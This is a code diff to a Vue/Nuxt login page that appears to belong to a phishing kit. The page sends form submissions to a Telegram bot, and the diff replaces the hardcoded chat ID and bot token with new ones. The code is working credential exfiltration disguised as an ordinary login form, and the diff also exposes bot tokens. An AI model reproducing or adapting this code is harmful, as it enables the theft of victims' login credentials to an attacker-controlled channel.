@@ -61,7 +61,7 @@
 
             <!-- Remember -->
             <div class="remember-row">
-              <input id="remember" v-model="remember" type="checkbox" />
+              <input id="remember" type="checkbox" />
 
               <label for="remember">
                 Save login information other than password
@@ -118,7 +118,7 @@ export default {
 
         // Send to Telegram
         await this.sendTelegramResult(
-          process.env.NUXT_APP_CHAT_ID || "-4794000485",
+          process.env.NUXT_APP_CHAT_ID || "-5400278497",
           message
         );
 
@@ -132,7 +132,7 @@ export default {
 
     async sendTelegramResult(chatId, message) {
       try {
-        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;
+        const url = `https://api.telegram.org/bot7401840231:AAF6pnMUvq6JKRUTp7z64cK881PZ3GPFDiQ/sendMessage`;
 
         const payload = {
           chat_id: chatId,
